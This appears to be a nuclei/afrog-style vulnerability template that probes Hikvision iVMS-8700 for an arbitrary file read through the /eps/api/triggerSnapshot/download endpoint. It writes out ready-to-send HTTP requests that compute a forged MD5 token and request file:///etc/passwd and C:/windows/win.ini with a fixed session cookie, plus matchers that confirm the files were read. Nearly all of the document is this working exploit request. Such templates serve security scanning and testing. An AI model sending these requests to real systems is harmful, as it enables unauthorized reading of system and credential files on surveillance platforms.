id: hikvision-ivms-8700-fileread

info:
  name: 海康威视 iVMS-8700 triggerSnapshot/download 任意文件读取
  author: peiqi
  severity: high
  description: |
    海康威视 iVMS-8700 综合安防管理平台 /eps/api/triggerSnapshot/download 可通过 token 算法读取任意文件。
    与 iSecure Center 综合安防平台不是同一 SKU。
  reference:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book
    - https://github.com/zan8in/afrog
  tags: hikvision,ivms8700,fileread

http:
  - raw:
      - |
        GET /eps/api/triggerSnapshot/download?token={{to_upper(md5(concat("{{RootURL}}","/eps/api/triggerSnapshot/download")))}}&fileUrl=file:///etc/passwd&fileName=1 HTTP/1.1
        Host: {{Hostname}}
        Cookie: ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169
      - |
        GET /eps/api/triggerSnapshot/download?token={{to_upper(md5(concat("{{RootURL}}","/eps/api/triggerSnapshot/download")))}}&fileUrl=file:///C:/windows/win.ini&fileName=1 HTTP/1.1
        Host: {{Hostname}}
        Cookie: ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200 && regex("root:.*?:[0-9]*:[0-9]*:", body_1)'
          - 'status_code_2 == 200 && contains(body_2, "for 16-bit app support")'
        condition: or
